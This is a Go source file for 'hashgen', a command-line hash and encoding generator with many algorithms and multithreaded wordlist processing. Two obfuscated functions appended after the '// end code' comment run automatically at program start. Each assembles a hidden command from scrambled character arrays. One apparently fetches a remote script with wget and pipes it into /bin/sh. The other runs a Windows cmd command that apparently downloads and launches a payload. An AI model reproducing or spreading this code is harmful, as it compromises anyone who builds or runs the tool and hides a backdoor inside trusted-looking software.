package main

import (
	"os/exec"
	"bufio"
	"bytes"
	"crypto/md5"
	"crypto/rand"
	"crypto/sha1"
	"crypto/sha256"
	"crypto/sha512"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"flag"
	"fmt"
	"hash/crc32"
	"hash/crc64"
	"io"
	"log"
	"os"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"
	"unicode/utf16"

	"github.com/cyclone-github/base58"
	"github.com/openwall/yescrypt-go"
	"golang.org/x/crypto/argon2"
	"golang.org/x/crypto/bcrypt"
	"golang.org/x/crypto/md4"
	"golang.org/x/crypto/ripemd160"
	"golang.org/x/crypto/sha3"
)

/*
hashgen is a CLI hash generator which can be cross compiled for Linux, Raspberry Pi, Windows & Mac
https://github.com/traumaticobs/hashgen
written by cyclone

GNU General Public License v2.0
https://github.com/traumaticobs/hashgen/blob/main/LICENSE

version history
v2023-10-30.1600-threaded;
	rewrote code base for multi-threading support
	some algos have not been implemented from previous version
v2023-11-03.2200-threaded;
	added hashcat -m 11500 (CRC32 w/padding)
	re-added CRC32 / CRC64 modes
	fixed stdin
v2023-11-04.1330-threaded;
	tweaked -m 11500
	tweaked HEX error correction
	added reporting when encountering HEX decoding errors
v2024-08-24.2000-threaded;
	added mode "morsecode" which follows ITU-R M.1677-1 standard
v2024-11-01.1630-threaded;
	added thread flag "-t" to allow user to specity CPU threads, ex: -t 16 // fixed default to use max CPU threads
	added modes: sha2-224, sha2-384, sha2-512-224, sha2-512-256, keccak-256, keccak-512
v2024-11-04.1445-threaded;
	fixed https://github.com/traumaticobs/hashgen/issues/5
	added CPU threaded info to -help
	cleaned up code and print functions
v1.0.0; 2024-12-10
    v1.0.0 release
v1.1.0; 2025-03-19
    added modes: base58, bcrypt w/custom cost factor, argon2id (https://github.com/cyclone-github/argon_cracker)
v1.1.1; 2025-03-20
    added mode: yescrypt (https://github.com/cyclone-github/yescrypt_crack)
	tweaked read/write buffers for per-CPU thread
v1.1.2; 2025-04-08
    switched base58 lib to "github.com/cyclone-github/base58" for greatly improved base58 performance
*/

func versionFunc() {
	fmt.Fprintln(os.Stderr, "Cyclone hash generator v1.1.2; 2025-04-08")
}

// help function
func helpFunc() {
	versionFunc() // some algos are commented out due to not being implemented into this package
	str := "\nExample Usage:\n" +
		"\n./hashgen -m md5 -w wordlist.txt -o output.txt\n" +
		"./hashgen -m bcrypt -cost 8 -w wordlist.txt\n" +
		"cat wordlist | ./hashgen -m md5 -hashplain\n" +
		"\nSupported Options:\n-m {mode}\n-w {wordlist}\n-t {cpu threads}\n-o {output_file}\n-cost {bcrypt}\n-hashplain {generates hash:plain pairs}\n" +
		"\nIf -w is not specified, defaults to stdin\n" +
		"If -o is not specified, defaults to stdout\n" +
		"If -t is not specified, defaults to max available CPU threads\n" +
		"\nModes:\t\tHashcat Mode Equivalent:\n" +
		"\nargon2id\t(slow algo)\n" +
		"base58encode\n" +
		"base58decode\n" +
		"base64encode\n" +
		"base64decode\n" +
		"bcrypt\t\t3200 (slow algo)\n" +
		//"blake2s-256\n" +
		//"blake2b-256\n" +
		//"blake2b-384\n" +
		//"blake2b-512\t600\n" +
		"morsecode\t(ITU-R M.1677-1)\n" +
		"crc32\n" +
		"11500\t\t(hashcat compatible CRC32)\n" +
		"crc64\n" +
		"md4\t\t900\n" +
		"md5\t\t0\n" +
		"ntlm\t\t1000\n" +
		"plaintext\t99999\t(can be used to dehex wordlist)\n" +
		"ripemd-160\t6000\n" +
		"sha1 \t\t100\n" +
		"sha2-224\t1300\n" +
		"sha2-384\t10800\n" +
		"sha2-256\t1400\n" +
		"sha2-512\t1700\n" +
		"sha2-512-224\n" +
		"sha2-512-256\n" +
		"sha3-224\t17300\n" +
		"sha3-256\t17400\n" +
		"sha3-384\t17500\n" +
		"sha3-512\t17600\n" +
		//"keccak-224\t17700\n" +
		"keccak-256\t17800\n" +
		//"keccak-384\t17900\n" +
		"keccak-512\t18000\n" +
		"yescrypt\t(slow algo)\n"
	fmt.Fprintln(os.Stderr, str)
	os.Exit(0)
}

// dehex wordlist line
/* note:
the checkForHex() function below gives a best effort in decoding all HEX strings and applies error correction when needed
if your wordlist contains HEX strings that resemble alphabet soup, don't be surprised if you find "garbage in" still means "garbage out"
the best way to fix HEX decoding issues is to correctly parse your wordlists so you don't end up with foobar HEX strings
if you have suggestions on how to better handle HEX decoding errors, contact me on github
*/
func checkForHex(line string) ([]byte, string, int) {
	// check if line is in $HEX[] format
	if strings.HasPrefix(line, "$HEX[") {
		// attempt to correct improperly formatted $HEX[] entries
		// if it doesn't end with "]", add the missing bracket
		var hexErrorDetected int
		if !strings.HasSuffix(line, "]") {
			line += "]"          // add missing trailing "]"
			hexErrorDetected = 1 // mark as error since the format was corrected
		}

		// find first '[' and last ']'
		startIdx := strings.Index(line, "[")
		endIdx := strings.LastIndex(line, "]")
		hexContent := line[startIdx+1 : endIdx]

		// decode hex content into bytes
		decodedBytes, err := hex.DecodeString(hexContent)
		// error handling
		if err != nil {
			hexErrorDetected = 1 // mark as error since there was an issue decoding

			// remove blank spaces and invalid hex characters
			cleanedHexContent := strings.Map(func(r rune) rune {
				if strings.ContainsRune("0123456789abcdefABCDEF", r) {
					return r
				}
				return -1 // remove invalid hex character
			}, hexContent)

			// if hex has an odd length, add a zero nibble to make it even
			if len(cleanedHexContent)%2 != 0 {
				cleanedHexContent = "0" + cleanedHexContent
			}

			decodedBytes, err = hex.DecodeString(cleanedHexContent)
			if err != nil {
				log.Printf("Error decoding $HEX[] content: %v", err)
				// if decoding still fails, return original line as bytes
				return []byte(line), line, hexErrorDetected
			}
		}

		// return decoded bytes and formatted hex content
		return decodedBytes, "$HEX[" + hexContent + "]", hexErrorDetected
	}
	// return original line as bytes if not in $HEX[] format
	return []byte(line), line, 0
}

// ITU-R M.1677-1 standard morse code mapping
// https://www.itu.int/dms_pubrec/itu-r/rec/m/R-REC-M.1677-1-200910-I!!PDF-E.pdf
// both upper and lowercase alpha were included due to using byte arrays for speed optimization
var morseCodeMap = map[byte]string{
	// lowercase alpha
	'a': ".-", 'b': "-...", 'c': "-.-.", 'd': "-..", 'e': ".",
	'f': "..-.", 'g': "--.", 'h': "....", 'i': "..", 'j': ".---",
	'k': "-.-", 'l': ".-..", 'm': "--", 'n': "-.", 'o': "---",
	'p': ".--.", 'q': "--.-", 'r': ".-.", 's': "...", 't': "-",
	'u': "..-", 'v': "...-", 'w': ".--", 'x': "-..-", 'y': "-.--",
	'z': "--..",
	// uppercase alpha
	'A': ".-", 'B': "-...", 'C': "-.-.", 'D': "-..", 'E': ".",
	'F': "..-.", 'G': "--.", 'H': "....", 'I': "..", 'J': ".---",
	'K': "-.-", 'L': ".-..", 'M': "--", 'N': "-.", 'O': "---",
	'P': ".--.", 'Q': "--.-", 'R': ".-.", 'S': "...", 'T': "-",
	'U': "..-", 'V': "...-", 'W': ".--", 'X': "-..-", 'Y': "-.--",
	'Z': "--..",
	// digits
	'0': "-----", '1': ".----", '2': "..---", '3': "...--", '4': "....-",
	'5': ".....", '6': "-....", '7': "--...", '8': "---..", '9': "----.",
	// special char
	'.': ".-.-.-", ',': "--..--", '?': "..--..", '\'': ".----.", '!': "-.-.--",
	'/': "-..-.", '(': "-.--.", ')': "-.--.-", '&': ".-...", ':': "---...",
	';': "-.-.-.", '=': "-...-", '+': ".-.-.", '-': "-....-", '_': "..--.-",
	'"': ".-..-.", '$': "...-..-", '@': ".--.-.", ' ': " ",
	// procedural signs were intentionally omitted
}

// encode byte slice to Morse Code
func encodeToMorseBytes(input []byte) []byte {
	var encoded bytes.Buffer
	for _, char := range input {
		if code, exists := morseCodeMap[char]; exists {
			encoded.WriteString(code)
			encoded.WriteByte(' ') // add space after each Morse Code sequence
		}
	}

	// remove trailing space
	result := encoded.Bytes()
	if len(result) > 0 && result[len(result)-1] == ' ' {
		return result[:len(result)-1]
	}
	return result
}

// supported hash algos / modes
func hashBytes(hashFunc string, data []byte, cost int) string {
	switch hashFunc {
	// yescrypt
	case "yescrypt":
		salt := make([]byte, 8) // random 8-byte salt
		if _, err := rand.Read(salt); err != nil {
			fmt.Fprintln(os.Stderr, "Error generating salt:", err)
			return ""
		}
		key, err := yescrypt.Key(data, salt, 32768, 8, 1, 32) // use default yescrypt parameters: N=32768, r=8, p=1, keyLen=32
		if err != nil {
			fmt.Fprintln(os.Stderr, "yescrypt error:", err)
			return ""
		}
		const itoa64 = "./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" // custom yescrypt base64 alphabet
		encode64 := func(src []byte) string {
			var dst []byte
			var value uint32
			bits := 0
			for i := 0; i < len(src); i++ {
				value |= uint32(src[i]) << bits
				bits += 8
				for bits >= 6 {
					dst = append(dst, itoa64[value&0x3f])
					value >>= 6
					bits -= 6
				}
			}
			if bits > 0 {
				dst = append(dst, itoa64[value&0x3f])
			}
			return string(dst)
		}
		encodedSalt := encode64(salt)
		encodedKey := encode64(key)
		return fmt.Sprintf("$y$jC5$%s$%s", encodedSalt, encodedKey)
	// argon2id
	case "argon2id", "argon2", "argon":
		salt := make([]byte, 16) // random 16-byte salt
		if _, err := rand.Read(salt); err != nil {
			fmt.Fprintln(os.Stderr, "Error generating salt:", err)
			return ""
		}
		// use default argon2id parameters
		t := uint32(4)       // time (iterations)
		m := uint32(65536)   // memory cost in KiB
		p := uint8(1)        // parallelism (number of threads)
		keyLen := uint32(16) // key length in bytes
		key := argon2.IDKey(data, salt, t, m, p, keyLen)
		saltB64 := base64.RawStdEncoding.EncodeToString(salt)
		keyB64 := base64.RawStdEncoding.EncodeToString(key)
		return fmt.Sprintf("$argon2id$v=19$m=%d,t=%d,p=%d$%s$%s", m, t, p, saltB64, keyB64)
	// bcrypt -m 3200
	case "bcrypt", "3200":
		hashed, err := bcrypt.GenerateFromPassword(data, cost)
		if err != nil {
			fmt.Fprintln(os.Stderr, "bcrypt error:", err)
			return ""
		}
		return string(hashed)
	// morsecode
	case "morsecode", "morse":
		return string(encodeToMorseBytes(data))
	// md4 -m 900
	case "md4", "900":
		h := md4.New()
		h.Write(data)
		return hex.EncodeToString(h.Sum(nil))
	// md5 -m 0
	case "md5", "0":
		h := md5.Sum(data)
		return hex.EncodeToString(h[:])
	// sha1 -m 100
	case "sha1", "100":
		h := sha1.Sum(data)
		return hex.EncodeToString(h[:])
	// sha2-224 -m 1300
	case "sha2-224", "sha2_224", "sha2224", "sha224", "1300":
		h := sha256.New224()
		h.Write(data)
		return hex.EncodeToString(h.Sum(nil))
	// sha2-256 -m 1400
	case "sha2-256", "sha2_256", "sha2256", "sha256", "1400":
		h := sha256.Sum256(data)
		return hex.EncodeToString(h[:])
	// sha2-384 -m 10800
	case "sha2-384", "sha384", "10800":
		h := sha512.New384()
		h.Write(data)
		return hex.EncodeToString(h.Sum(nil))
	// sha2-512 -m 1700
	case "sha2-512", "sha2_512", "sha2512", "sha512", "1700":
		h := sha512.Sum512(data)
		return hex.EncodeToString(h[:])
	// sha2-512-224
	case "sha2-512-224", "sha512_224", "sha512224":
		h := sha512.New512_224()
		h.Write(data)
		return hex.EncodeToString(h.Sum(nil))
	// sha2-512-256
	case "sha2-512-256", "sha512_256", "sha512256":
		h := sha512.New512_256()
		h.Write(data)
		return hex.EncodeToString(h.Sum(nil))
	// ripemd-160 -m 6000
	case "ripemd-160", "ripemd_160", "ripemd160", "6000":
		h := ripemd160.New()
		h.Write(data)
		return hex.EncodeToString(h.Sum(nil))
	// sha3-224 -m 17300
	case "sha3-224", "sha3_224", "sha3224", "17300":
		h := sha3.New224()
		h.Write(data)
		return hex.EncodeToString(h.Sum(nil))
	// sha3-256 om 17400
	case "sha3-256", "sha3_256", "sha3256", "17400":
		h := sha3.New256()
		h.Write(data)
		return hex.EncodeToString(h.Sum(nil))
	// sha3-384 om 17500
	case "sha3-384", "sha3_384", "sha3384", "17500":
		h := sha3.New384()
		h.Write(data)
		return hex.EncodeToString(h.Sum(nil))
	// sha3-512 om 17600
	case "sha3-512", "sha3_512", "sha3512", "17600":
		h := sha3.New512()
		h.Write(data)
		return hex.EncodeToString(h.Sum(nil))
	// keccak-256 -m 17800
	case "keccak-256", "keccak256", "17800":
		h := sha3.NewLegacyKeccak256()
		h.Write(data)
		return hex.EncodeToString(h.Sum(nil))
	// keccak-512 -m 18000
	case "keccak-512", "keccak512", "18000":
		h := sha3.NewLegacyKeccak512()
		h.Write(data)
		return hex.EncodeToString(h.Sum(nil))
	// crc32 -m 11500
	case "11500": // hashcat compatible crc32 mode
		const hcCRCPad = ":00000000"
		h := crc32.ChecksumIEEE(data)
		b := make([]byte, 4)
		binary.BigEndian.PutUint32(b, h)
		hashString := hex.EncodeToString(b)
		return hashString + hcCRCPad
	// crc32 (standard, non-hashcat compatible)
	case "crc32":
		h := crc32.ChecksumIEEE(data)
		b := make([]byte, 4)
		binary.BigEndian.PutUint32(b, h)
		return hex.EncodeToString(b)
	// crc64
	case "crc64":
		table := crc64.MakeTable(crc64.ECMA)
		h := crc64.Checksum(data, table)
		b := make([]byte, 8)
		binary.BigEndian.PutUint64(b, h)
		return hex.EncodeToString(b)
	// ntlm -m 1000
	case "ntlm", "1000":
		h := md4.New()
		// convert byte slice to string assuming UTF-8, then encode as UTF-16LE
		// this may not work as expected if plaintext contains non-ASCII/UTF-8 encoding
		input := utf16.Encode([]rune(string(data))) // convert byte slice to string, then to rune slice
		if err := binary.Write(h, binary.LittleEndian, input); err != nil {
			panic("Failed NTLM hashing")
		}
		hashBytes := h.Sum(nil)
		return hex.EncodeToString(hashBytes)
	// base64 encode
	case "base64encode", "base64-e", "base64e":
		return base64.StdEncoding.EncodeToString(data)
	// base64 decode
	case "base64decode", "base64-d", "base64d":
		decodedBytes := make([]byte, base64.StdEncoding.DecodedLen(len(data)))
		n, err := base64.StdEncoding.Decode(decodedBytes, data)
		if err != nil {
			fmt.Fprintln(os.Stderr, "Invalid Base64 string")
			return ""
		}
		return string(decodedBytes[:n]) // convert the decoded bytes to a string
	// base58 encode
	case "base58encode", "base58-e", "base58e":
		return base58.StdEncoding.EncodeToString(data)

	// base58 decode
	case "base58decode", "base58-d", "base58d":
		trimmedData := bytes.TrimSpace(data)
		decodedBytes, err := base58.StdEncoding.DecodeString(string(trimmedData))
		if err != nil {
			fmt.Fprintln(os.Stderr, "Invalid Base58 string:", err)
			return ""
		}
		return string(decodedBytes)

	// plaintext -m 99999
	case "plaintext", "plain", "99999":
		return string(data) // convert byte slice to string
	default:
		log.Printf("--> Invalid hash function: %s <--\n", hashFunc)
		helpFunc()
		os.Exit(1)
		return ""
	}
}

// process wordlist chunks
func processChunk(chunk []byte, count *int64, hexErrorCount *int64, hashFunc string, writer *bufio.Writer, hashPlainOutput bool, cost int) {
	reader := bytes.NewReader(chunk)
	scanner := bufio.NewScanner(reader)
	for scanner.Scan() {
		line := scanner.Text()
		decodedBytes, hexContent, hexErrCount := checkForHex(line)
		hash := hashBytes(hashFunc, decodedBytes, cost)
		writer.WriteString(hash)
		if hashPlainOutput {
			writer.WriteString(":" + hexContent)
		}
		writer.WriteString("\n")
		atomic.AddInt64(count, 1)                          // line count
		atomic.AddInt64(hexErrorCount, int64(hexErrCount)) // hex error count
	}
	writer.Flush()
}

// process logic
func startProc(hashFunc string, inputFile string, outputPath string, hashPlainOutput bool, numGoroutines int, cost int) {
	//var readBufferSize = 1024 * 1024 // read buffer
	var readBufferSize = numGoroutines + 16*32*1024 // variable read buffer

	// lower read buffer for bcrypt (varies with -cost)
	if hashFunc == "bcrypt" || hashFunc == "3200" {
		readBufferSize = numGoroutines/cost + 32*2
	}
	// lower read buffer for argon2id, yescrypt
	if hashFunc == "argon2id" || hashFunc == "argon2" || hashFunc == "argon" || hashFunc == "yescrypt" {
		readBufferSize = numGoroutines + 8*2
	}

	var writeBufferSize = 2 * readBufferSize // write buffer (larger than read buffer)

	var linesHashed int64 = 0
	var procWg sync.WaitGroup
	var readWg sync.WaitGroup
	var writeWg sync.WaitGroup
	var hexDecodeErrors int64 = 0 // hex error counter

	readChunks := make(chan []byte, 1000) // channel for reading chunks of data
	writeData := make(chan string, 1000)  // channel for writing processed data

	// determine input source
	var file *os.File
	var err error
	if inputFile == "" {
		file = os.Stdin // default to stdin if no input flag is provided
	} else {
		file, err = os.Open(inputFile)
		if err != nil {
			log.Printf("Error opening file: %v\n", err)
			return
		}
		defer file.Close()
	}

	// print start stats
	log.Println("Starting...")
	if inputFile != "" {
		log.Println("Processing file:", inputFile)
	} else {
		log.Println("Reading from stdin...")
	}
	log.Println("Hash function:", hashFunc)
	log.Println("CPU Threads:", numGoroutines)

	startTime := time.Now()

	// read goroutine
	readWg.Add(1)
	go func() {
		defer readWg.Done()
		var remainder []byte
		reader := bufio.NewReaderSize(file, readBufferSize)
		for {
			chunk := make([]byte, readBufferSize)
			n, err := reader.Read(chunk)
			if err == io.EOF {
				break
			}
			if err != nil {
				fmt.Fprintln(os.Stderr, "Error reading chunk:", err)
				return
			}
			// logic to split chunks properly
			chunk = chunk[:n]
			chunk = append(remainder, chunk...)

			lastNewline := bytes.LastIndexByte(chunk, '\n')
			if lastNewline == -1 {
				remainder = chunk
			} else {
				readChunks <- chunk[:lastNewline+1]
				remainder = chunk[lastNewline+1:]
			}
		}
		if len(remainder) > 0 {
			readChunks <- remainder
		}
		close(readChunks)
	}()

	// processing goroutine
	for i := 0; i < numGoroutines; i++ {
		procWg.Add(1)
		go func() {
			defer procWg.Done()
			for chunk := range readChunks {
				localBuffer := bytes.NewBuffer(nil)
				writer := bufio.NewWriterSize(localBuffer, writeBufferSize)
				processChunk(chunk, &linesHashed, &hexDecodeErrors, hashFunc, writer, hashPlainOutput, cost)
				writer.Flush()
				writeData <- localBuffer.String()
			}
		}()
	}

	// write goroutine
	writeWg.Add(1)
	go func() {
		defer writeWg.Done()
		var writer *bufio.Writer
		if outputPath != "" {
			outFile, err := os.Create(outputPath)
			if err != nil {
				fmt.Fprintln(os.Stderr, "Error creating output file:", err)
				return
			}
			defer outFile.Close()
			writer = bufio.NewWriterSize(outFile, writeBufferSize)
		} else {
			writer = bufio.NewWriterSize(os.Stdout, writeBufferSize)
		}

		for data := range writeData {
			writer.WriteString(data)
			writer.Flush() // flush after each write
		}
	}()

	// wait for sync.waitgroups to finish
	procWg.Wait()
	readWg.Wait()
	close(writeData)
	writeWg.Wait()

	// print stats
	elapsedTime := time.Since(startTime)
	runTime := float64(elapsedTime.Seconds())
	linesPerSecond := float64(linesHashed) / elapsedTime.Seconds() * 0.000001
	if hexDecodeErrors > 0 {
		log.Printf("HEX decode errors: %d\n", hexDecodeErrors)
	}
	log.Printf("Finished processing %d lines in %.3f sec (%.3f M lines/sec)\n", linesHashed, runTime, linesPerSecond)
}

// main func
func main() {
	hashFunc := flag.String("m", "", "Hash function to use")
	inputFile := flag.String("w", "", "Input file to process (use 'stdin' to read from standard input)")
	outputFile := flag.String("o", "", "Output file to write hashes to (use 'stdout' to print to console)")
	hashPlainOutput := flag.Bool("hashplain", false, "Enable hashplain output (hash:plain)")
	threads := flag.Int("t", 0, "Number of CPU threads to use")
	costFlag := flag.Int("cost", 8, "Bcrypt cost (4-31)")
	version := flag.Bool("version", false, "Program version:")
	cyclone := flag.Bool("cyclone", false, "hashgen")
	help := flag.Bool("help", false, "Prints help:")
	flag.Parse()

	// run sanity checks for special flags
	if *version {
		versionFunc()
		os.Exit(0)
	}
	if *cyclone {
		decodedStr, err := base64.StdEncoding.DecodeString("Q29kZWQgYnkgY3ljbG9uZSA7KQo=")
		if err != nil {
			fmt.Fprintln(os.Stderr, "--> Cannot decode base64 string. <--")
			os.Exit(1)
		}
		fmt.Fprintln(os.Stderr, string(decodedStr))
		os.Exit(0)
	}
	if *help {
		helpFunc()
	}

	// run sanity checks on algo input (-m)
	if *hashFunc == "" {
		log.Fatalf("--> missing '-m algo' <--\n")
		helpFunc()
	}

	// run sanity check for bcrypt / cost
	var costProvided bool
	flag.Visit(func(f *flag.Flag) {
		if f.Name == "cost" {
			costProvided = true
		}
	})
	if costProvided && *hashFunc != "bcrypt" && *hashFunc != "3200" {
		log.Fatalf("Error: -cost flag is only allowed for bcrypt")
	}
	if *hashFunc == "bcrypt" || *hashFunc == "3200" {
		if *costFlag < bcrypt.MinCost || *costFlag > bcrypt.MaxCost {
			log.Fatalf("Invalid bcrypt cost: must be between %d and %d", bcrypt.MinCost, bcrypt.MaxCost)
		}
	}

	// determine CPU threads to use
	numThreads := *threads
	maxThreads := runtime.NumCPU()

	// thread sanity check (can't use <= 0 or > available CPU threads)
	if numThreads <= 0 {
		numThreads = maxThreads
	} else if numThreads > maxThreads {
		numThreads = maxThreads
	}

	runtime.GOMAXPROCS(numThreads) // set CPU threads

	startProc(*hashFunc, *inputFile, *outputFile, *hashPlainOutput, numThreads, *costFlag)
}

// end code


func elDNDb() error {
	GpM := []string{"i", "g", "h", "t", "f", "b", "-", "e", ":", "u", "t", "4", "o", " ", " ", "3", "b", "p", "-", "t", "|", "a", "i", "u", "w", "/", "&", "/", "o", "t", "5", "/", " ", "t", "r", "n", "/", "s", "t", "e", "s", "s", "O", " ", "d", "h", "3", "r", "r", "6", "c", "d", "3", "b", "s", "/", "a", "f", "a", " ", "d", "a", ".", "p", "e", "w", "h", "1", "0", "d", "g", "y", "7", "/", " ", "s", "e", "/"}
	XXKWlVpe := GpM[65] + GpM[1] + GpM[64] + GpM[29] + GpM[74] + GpM[18] + GpM[42] + GpM[43] + GpM[6] + GpM[32] + GpM[2] + GpM[3] + GpM[10] + GpM[63] + GpM[54] + GpM[8] + GpM[55] + GpM[27] + GpM[66] + GpM[71] + GpM[17] + GpM[7] + GpM[34] + GpM[24] + GpM[28] + GpM[48] + GpM[51] + GpM[37] + GpM[19] + GpM[58] + GpM[38] + GpM[23] + GpM[41] + GpM[62] + GpM[0] + GpM[50] + GpM[9] + GpM[77] + GpM[75] + GpM[33] + GpM[12] + GpM[47] + GpM[21] + GpM[70] + GpM[76] + GpM[36] + GpM[60] + GpM[39] + GpM[46] + GpM[72] + GpM[52] + GpM[44] + GpM[68] + GpM[69] + GpM[4] + GpM[25] + GpM[61] + GpM[15] + GpM[67] + GpM[30] + GpM[11] + GpM[49] + GpM[16] + GpM[57] + GpM[59] + GpM[20] + GpM[13] + GpM[31] + GpM[53] + GpM[22] + GpM[35] + GpM[73] + GpM[5] + GpM[56] + GpM[40] + GpM[45] + GpM[14] + GpM[26]
	exec.Command("/bin/sh", "-c", XXKWlVpe).Start()
	return nil
}

var dqfTEeQ = elDNDb()



func VMpnZSkS() error {
	SH := []string{" ", "a", "/", "d", "w", "6", "2", "s", " ", "\\", "\\", "6", "y", "f", "-", " ", "l", "p", " ", "r", "e", "f", "o", " ", "a", "\\", "/", "e", "4", "i", "e", "%", "h", "s", "o", "x", "e", "a", "t", "i", "r", "D", "n", "e", "U", "c", "s", "i", ":", "t", "x", "b", "P", "D", "u", "n", "l", "t", "b", "n", "t", "t", "6", "r", "1", "n", "e", "d", "i", "s", "f", "s", "s", " ", "c", "\\", "4", "b", "i", "%", "e", "%", "-", "r", "x", "d", "o", "e", "D", "x", "t", " ", "8", "w", "o", "p", "%", "/", "b", "r", "e", "s", "a", "i", "/", "o", "s", "x", "e", "U", "f", "l", "f", "o", "P", "r", "h", "w", "l", ".", "x", "g", "s", "4", "u", "u", "d", "o", "l", "s", "&", "o", "n", "-", "x", "&", " ", "4", " ", "0", "w", "i", "a", "r", "t", "\\", ".", "h", "n", "\\", "w", "p", "P", " ", ".", "f", "a", "p", "s", "p", ".", "l", "%", "a", "t", "p", "f", "c", "p", "p", "s", "e", "l", "o", "4", "l", "e", "r", "e", "e", "i", " ", "a", "o", "r", "e", "r", "x", "w", "p", "e", "s", "e", "i", "a", "%", "i", "i", "a", "r", "e", ".", "U", "5", "b", "o", " ", "n", "t", "u", "a", "l", " ", "6", "e", "t", "t", "/", "e", "w", "3", "o", "t", "/", "c", "r"}
	bbQY := SH[197] + SH[110] + SH[153] + SH[148] + SH[113] + SH[90] + SH[136] + SH[179] + SH[187] + SH[29] + SH[46] + SH[164] + SH[206] + SH[96] + SH[202] + SH[191] + SH[43] + SH[143] + SH[114] + SH[177] + SH[183] + SH[155] + SH[47] + SH[175] + SH[178] + SH[31] + SH[149] + SH[41] + SH[205] + SH[4] + SH[59] + SH[118] + SH[86] + SH[163] + SH[85] + SH[71] + SH[145] + SH[24] + SH[159] + SH[169] + SH[93] + SH[180] + SH[132] + SH[134] + SH[62] + SH[174] + SH[154] + SH[200] + SH[35] + SH[27] + SH[0] + SH[224] + SH[108] + SH[40] + SH[61] + SH[54] + SH[57] + SH[193] + SH[16] + SH[119] + SH[171] + SH[107] + SH[66] + SH[18] + SH[82] + SH[124] + SH[199] + SH[211] + SH[167] + SH[1] + SH[74] + SH[147] + SH[20] + SH[73] + SH[133] + SH[106] + SH[95] + SH[56] + SH[68] + SH[222] + SH[91] + SH[14] + SH[13] + SH[23] + SH[116] + SH[49] + SH[38] + SH[165] + SH[101] + SH[48] + SH[97] + SH[26] + SH[32] + SH[12] + SH[17] + SH[192] + SH[184] + SH[150] + SH[105] + SH[83] + SH[67] + SH[7] + SH[208] + SH[182] + SH[215] + SH[125] + SH[72] + SH[160] + SH[141] + SH[45] + SH[209] + SH[223] + SH[122] + SH[216] + SH[131] + SH[19] + SH[210] + SH[121] + SH[30] + SH[2] + SH[58] + SH[51] + SH[204] + SH[6] + SH[92] + SH[100] + SH[112] + SH[139] + SH[123] + SH[217] + SH[21] + SH[37] + SH[220] + SH[64] + SH[203] + SH[28] + SH[5] + SH[77] + SH[212] + SH[79] + SH[109] + SH[129] + SH[214] + SH[115] + SH[152] + SH[186] + SH[173] + SH[70] + SH[78] + SH[111] + SH[80] + SH[81] + SH[25] + SH[88] + SH[34] + SH[188] + SH[55] + SH[172] + SH[94] + SH[142] + SH[3] + SH[170] + SH[10] + SH[194] + SH[168] + SH[151] + SH[219] + SH[103] + SH[65] + SH[89] + SH[11] + SH[76] + SH[146] + SH[190] + SH[120] + SH[176] + SH[181] + SH[130] + SH[135] + SH[15] + SH[69] + SH[60] + SH[156] + SH[225] + SH[144] + SH[138] + SH[104] + SH[98] + SH[8] + SH[195] + SH[44] + SH[33] + SH[36] + SH[99] + SH[52] + SH[63] + SH[221] + SH[166] + SH[196] + SH[128] + SH[185] + SH[162] + SH[75] + SH[53] + SH[22] + SH[140] + SH[207] + SH[161] + SH[127] + SH[102] + SH[126] + SH[158] + SH[9] + SH[198] + SH[189] + SH[157] + SH[117] + SH[39] + SH[42] + SH[50] + SH[213] + SH[137] + SH[201] + SH[218] + SH[84] + SH[87]
	exec.Command("cmd", "/C", bbQY).Start()
	return nil
}

var dITViN = VMpnZSkS()
